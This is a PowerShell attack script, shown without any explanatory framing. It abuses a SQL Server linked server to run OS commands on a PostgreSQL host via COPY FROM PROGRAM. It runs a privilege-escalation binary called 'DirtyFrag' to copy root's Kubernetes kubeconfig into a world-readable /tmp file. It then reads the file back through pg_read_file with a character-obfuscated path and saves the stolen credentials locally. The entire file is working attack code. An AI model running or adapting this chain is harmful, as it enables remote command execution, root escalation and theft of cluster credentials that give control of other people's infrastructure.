$q=[char]39; $dq=[char]36+[char]36

function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}

# Write script that copies kubeconfig to world-readable location
sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY (SELECT 'cp /root/.kube/config /tmp/kc_copy.txt && chmod 644 /tmp/kc_copy.txt && echo COPIED') TO PROGRAM ${dq}tee /tmp/copy_kube.sh${dq}$q) AT PG145" 2>&1 | Out-Null
PG145-Exec "chmod +x /tmp/copy_kube.sh" | Out-Null

# Run DirtyFrag to execute copy as root
Write-Output "RUNNING_DIRTYFRAG..."
$r = PG145-Exec "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo 'bash /tmp/copy_kube.sh' | timeout 45 /tmp/df 2>/dev/null"
Write-Output "DF_DONE: $r"

# Now read the copied file via pg_read_file (postgres can read /tmp/)
$tmpkc = "chr(47)||chr(116)||chr(109)||chr(112)||chr(47)||chr(107)||chr(99)||chr(95)||chr(99)||chr(111)||chr(112)||chr(121)||chr(46)||chr(116)||chr(120)||chr(116)"
$sql = "SELECT * FROM OPENQUERY(PG145,$q`SELECT pg_read_file($tmpkc,0,65536,true) as r$q)"
$r2 = sqlcmd -S localhost -x -h -1 -W -Q $sql 2>&1
$outPath = Join-Path "F:\Database" "kubeconfig_copied.txt"
$r2 | Out-File $outPath -Encoding ASCII
$lines = ($r2 | Where-Object {$_ -ne "" -and $_ -notmatch "rows affected|---"} | Measure-Object).Count
Write-Output "KUBECONFIG_LINES: $lines"
# Show first 5 lines
$r2 | Where-Object {$_ -ne "" -and $_ -notmatch "rows affected|---"} | Select-Object -First 5 | ForEach-Object { Write-Output $_ }
